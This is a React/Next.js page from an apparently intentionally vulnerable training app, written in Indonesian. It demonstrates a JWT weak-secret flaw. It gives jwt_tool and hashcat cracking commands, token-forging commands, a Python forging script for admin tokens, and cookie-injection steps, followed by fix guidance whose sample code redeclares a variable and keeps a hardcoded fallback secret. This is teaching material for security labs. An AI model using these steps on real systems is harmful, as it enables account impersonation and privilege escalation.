'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import UserNav from '@/components/UserNav';

export default function ScenarioJWTPage() {
  const router = useRouter();
  const [currentToken, setCurrentToken] = useState('');
  const [decodedToken, setDecodedToken] = useState<any>(null);
  const [customPayload, setCustomPayload] = useState('');
  const [loading, setLoading] = useState(false);
  const [testResult, setTestResult] = useState('');

  useEffect(() => {
    // Get current JWT token from cookie
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('token='))
      ?.split('=')[1];

    if (token) {
      setCurrentToken(token);
      decodeJWT(token);
    }
  }, []);

  const decodeJWT = (token: string) => {
    try {
      const parts = token.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(atob(parts[1]));
        setDecodedToken(payload);
        setCustomPayload(JSON.stringify(payload, null, 2));
      }
    } catch (error) {
      console.error('Failed to decode JWT:', error);
    }
  };

  const testForgedToken = async () => {
    setLoading(true);
    setTestResult('');

    try {
      const response = await fetch('/api/auth/me', {
        headers: {
          'Cookie': `token=${currentToken}`
        }
      });
      const data = await response.json();

      if (response.ok) {
        setTestResult(JSON.stringify(data, null, 2));
      } else {
        setTestResult('Error: ' + (data.error || 'Failed to verify token'));
      }
    } catch (err: any) {
      setTestResult('Error: ' + err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <UserNav />
      <div className="container mx-auto px-4 py-8">
        {/* Vulnerability Warning Banner */}
        <div className="bg-red-100 border-2 border-red-500 rounded-lg p-6 mb-8">
          <div className="flex items-start">
            <div className="text-3xl mr-4">🔐</div>
            <div className="flex-1">
              <h2 className="text-2xl font-bold text-red-800 mb-2">
                Skenario JWT - Weak Secret Vulnerability
              </h2>
              <p className="text-red-700 mb-4">
                Aplikasi ini menggunakan JWT dengan <strong>weak secret</strong> yang dapat di-crack oleh attacker!
              </p>
              <div className="bg-white rounded p-4 mt-4">
                <p className="font-semibold text-gray-800 mb-2">Vulnerability Explanation:</p>
                <ul className="list-disc list-inside text-sm text-gray-700 space-y-1">
                  <li>
                    JWT menggunakan secret key: <code className="bg-red-200 px-2 py-1 rounded font-bold">"secret"</code>
                  </li>
                  <li>
                    Secret ini sangat lemah dan ada di wordlist umum seperti rockyou.txt
                  </li>
                  <li>
                    Attacker dapat menggunakan tools seperti <strong>jwt_tool</strong> atau <strong>hashcat</strong> untuk crack secret
                  </li>
                  <li>
                    Setelah mendapat secret, attacker dapat forge JWT dengan role "admin" atau userId orang lain
                  </li>
                  <li>
                    Ini memungkinkan privilege escalation dan identity spoofing
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">JWT Weak Secret Vulnerability Demo</h1>
          <Link href="/user/dashboard" className="btn-secondary">
            ← Kembali ke Dashboard
          </Link>
        </div>

        {/* Current JWT Token */}
        <div className="card mb-6">
          <h3 className="text-lg font-bold mb-4">1. Your Current JWT Token</h3>
          <p className="text-sm text-gray-600 mb-4">
            Token ini disimpan di cookie dan digunakan untuk autentikasi:
          </p>
          <div className="bg-gray-100 p-4 rounded mb-4 overflow-x-auto">
            <code className="text-xs break-all">{currentToken || 'No token found'}</code>
          </div>

          {decodedToken && (
            <div className="mt-4">
              <p className="text-sm font-semibold mb-2">Decoded Payload:</p>
              <pre className="bg-blue-50 border border-blue-300 p-3 rounded text-xs overflow-x-auto">
                {JSON.stringify(decodedToken, null, 2)}
              </pre>
            </div>
          )}
        </div>

        {/* Attack Steps */}
        <div className="card mb-6 bg-yellow-50 border border-yellow-300">
          <h3 className="text-lg font-bold text-yellow-900 mb-4">2. Cara Exploit JWT Weak Secret</h3>

          <div className="space-y-4">
            <div className="bg-white rounded p-4">
              <p className="text-sm font-semibold text-gray-800 mb-2">Step 1: Copy JWT Token</p>
              <p className="text-xs text-gray-700 mb-2">
                Copy token di atas atau dari cookie browser (Developer Tools → Application → Cookies)
              </p>
            </div>

            <div className="bg-white rounded p-4">
              <p className="text-sm font-semibold text-gray-800 mb-2">Step 2: Crack JWT Secret dengan jwt_tool</p>
              <p className="text-xs text-gray-700 mb-2">
                Install jwt_tool dan crack secret:
              </p>
              <pre className="bg-gray-100 p-2 rounded text-xs overflow-x-auto mb-2">
{`# Install jwt_tool
pip3 install pyjwt

# Atau download dari GitHub
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack dengan dictionary attack
python3 jwt_tool.py YOUR_TOKEN_HERE -C -d /usr/share/wordlists/rockyou.txt

# Atau gunakan common secrets wordlist
python3 jwt_tool.py YOUR_TOKEN_HERE -C -d jwt.secrets.list`}
              </pre>
              <div className="bg-green-50 border border-green-300 p-2 rounded">
                <p className="text-xs text-green-800">
                  Expected Result: Secret akan ditemukan dalam hitungan detik karena menggunakan "secret"
                </p>
              </div>
            </div>

            <div className="bg-white rounded p-4">
              <p className="text-sm font-semibold text-gray-800 mb-2">Step 3: Crack dengan hashcat (Alternatif - Lebih Cepat)</p>
              <pre className="bg-gray-100 p-2 rounded text-xs overflow-x-auto mb-2">
{`# Format JWT untuk hashcat
echo "YOUR_TOKEN_HERE" > jwt.txt

# Crack dengan hashcat mode 16500 (JWT)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Untuk common passwords
hashcat -a 0 -m 16500 jwt.txt common-passwords.txt`}
              </pre>
            </div>

            <div className="bg-white rounded p-4">
              <p className="text-sm font-semibold text-gray-800 mb-2">Step 4: Forge JWT dengan Secret yang Didapat</p>
              <p className="text-xs text-gray-700 mb-2">
                Setelah mendapat secret "secret", forge JWT baru dengan role admin:
              </p>
              <pre className="bg-gray-100 p-2 rounded text-xs overflow-x-auto mb-2">
{`# Forge JWT dengan jwt_tool
python3 jwt_tool.py YOUR_TOKEN_HERE -T -S hs256 -p "secret"

# Atau forge dengan custom payload (ganti role ke admin)
python3 jwt_tool.py YOUR_TOKEN_HERE \\
  -I -pc role -pv admin \\
  -S hs256 -p "secret"

# Atau forge dengan userId orang lain
python3 jwt_tool.py YOUR_TOKEN_HERE \\
  -I -pc userId -pv 1 \\
  -S hs256 -p "secret"`}
              </pre>
            </div>

            <div className="bg-white rounded p-4">
              <p className="text-sm font-semibold text-gray-800 mb-2">Step 5: Gunakan Forged Token</p>
              <p className="text-xs text-gray-700 mb-2">
                Replace token di cookie browser dengan forged token:
              </p>
              <pre className="bg-gray-100 p-2 rounded text-xs overflow-x-auto mb-2">
{`// Di Browser DevTools Console
document.cookie = "token=FORGED_TOKEN_HERE; path=/";

// Atau gunakan curl
curl http://localhost:3000/api/auth/me \\
  -H "Cookie: token=FORGED_TOKEN_HERE"`}
              </pre>
              <div className="bg-red-50 border border-red-300 p-2 rounded">
                <p className="text-xs text-red-800">
                  Result: Anda sekarang berhasil mengakses sistem sebagai admin atau user lain!
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Online Tools */}
        <div className="card mb-6 bg-blue-50 border border-blue-300">
          <h3 className="text-lg font-bold text-blue-900 mb-4">3. Online Tools untuk Testing</h3>
          <div className="space-y-3">
            <div className="bg-white rounded p-3">
              <p className="text-sm font-semibold text-gray-800 mb-2">JWT.io - Decode & Verify</p>
              <p className="text-xs text-gray-700 mb-2">
                Paste token Anda di <a href="https://jwt.io" target="_blank" rel="noopener noreferrer" className="text-blue-600 underline">jwt.io</a>
              </p>
              <p className="text-xs text-gray-600">
                Masukkan secret "secret" di bagian verify signature untuk membuat token baru
              </p>
            </div>

            <div className="bg-white rounded p-3">
              <p className="text-sm font-semibold text-gray-800 mb-2">Python Script untuk Forge JWT</p>
              <pre className="bg-gray-100 p-2 rounded text-xs overflow-x-auto">
{`import jwt
import datetime

# Payload yang ingin diforge
payload = {
    "userId": 1,  # Admin user ID
    "username": "admin",
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
}

# Secret yang sudah di-crack
secret = "secret"

# Generate forged token
forged_token = jwt.encode(payload, secret, algorithm="HS256")
print("Forged Token:", forged_token)`}
              </pre>
            </div>
          </div>
        </div>

        {/* Test Current Token */}
        <div className="card mb-6">
          <h3 className="text-lg font-bold mb-4">4. Test Your Token</h3>
          <p className="text-sm text-gray-600 mb-4">
            Verifikasi token Anda dengan memanggil API /api/auth/me:
          </p>
          <button
            onClick={testForgedToken}
            disabled={loading || !currentToken}
            className="btn-primary mb-4"
          >
            {loading ? 'Testing...' : 'Test Current Token'}
          </button>

          {testResult && (
            <div className="bg-gray-100 p-4 rounded">
              <p className="text-sm font-semibold mb-2">API Response:</p>
              <pre className="text-xs overflow-x-auto">
                {testResult}
              </pre>
            </div>
          )}
        </div>

        {/* Fix Instructions */}
        <div className="card bg-green-50 border border-green-300">
          <h3 className="text-lg font-bold text-green-900 mb-3">🛠️ Cara Fix Vulnerability Ini:</h3>
          <div className="bg-white rounded p-4">
            <p className="text-sm text-gray-700 mb-3">
              Edit file <code className="bg-gray-200 px-2 py-1 rounded">/lib/auth.ts</code>:
            </p>

            <p className="text-sm font-semibold text-red-800 mb-2">❌ Current (Vulnerable):</p>
            <pre className="bg-red-50 border border-red-300 p-3 rounded text-xs mb-4 overflow-x-auto">
{`const secret = new TextEncoder().encode(
  process.env.JWT_SECRET || 'secret'  // WEAK SECRET!
);`}
            </pre>

            <p className="text-sm font-semibold text-green-800 mb-2">✓ Fixed (Secure):</p>
            <pre className="bg-green-50 border border-green-300 p-3 rounded text-xs mb-4 overflow-x-auto">
{`// Generate strong random secret:
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

const secret = new TextEncoder().encode(
  process.env.JWT_SECRET ||
  'a1b2c3d4e5f6789012345678901234567890abcdefghijklmnopqrstuvwxyz1234'
);

// Better: Always use environment variable
if (!process.env.JWT_SECRET) {
  throw new Error('JWT_SECRET must be set in environment');
}

const secret = new TextEncoder().encode(process.env.JWT_SECRET);`}
            </pre>

            <div className="mt-4 space-y-2">
              <p className="text-sm font-semibold text-gray-800">Best Practices:</p>
              <ul className="list-disc list-inside text-xs text-gray-700 space-y-1">
                <li>Gunakan secret minimal 32 characters dengan random characters</li>
                <li>Simpan secret di environment variable, JANGAN hardcode</li>
                <li>Rotate secret secara berkala</li>
                <li>Gunakan algoritma HS256 atau lebih baik RS256 (asymmetric)</li>
                <li>Set expiration time yang reasonable (jangan terlalu lama)</li>
                <li>Implement token refresh mechanism</li>
                <li>Monitor untuk suspicious token generation patterns</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
